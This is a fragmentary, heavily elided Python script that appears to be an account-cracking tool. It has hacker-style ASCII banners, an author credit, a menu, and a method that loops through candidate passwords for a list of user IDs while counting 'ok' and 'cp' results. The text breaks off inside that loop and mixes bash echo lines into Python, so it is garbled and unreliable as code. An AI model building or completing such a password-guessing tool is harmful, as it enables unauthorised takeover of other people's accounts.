...
| $$      | $$| $$    | $$_____/        | $$  | $$ /$$__  $$| $$      | $$_  $$ | $$_____/| $$      
| $$$$$$$$| $$| $$    |  $$$$$$$        | $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$      
|________/|__/|__/     \_______/        |__/  |__/ \_______/ \_______/|__/  \__/ \_______/|__/      
                                                                                               
 '\033[92m'echo "    __  ___      __          __          __  ";
echo "   /  |/  /___ _/ /_  ____ _/ /_  __  __/ /_ ";
echo "  / /|_/ / __ \`/ __ \/ __ \`/ __ \/ / / / __ \";
echo " / /  / / /_/ / / / / /_/ / /_/ / /_/ / /_/ /";
echo "/_/  /_/\__,_/_/ /_/\__,_/_.___/\__,_/_.___/ ";
echo "                                             ";                                                                                                   
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Mahabub✓™
...
def sarfraz():
    ...
    print(' [2] Create File [some error⛔]')
    print(' [E] exit ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[✓Life-hacker] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
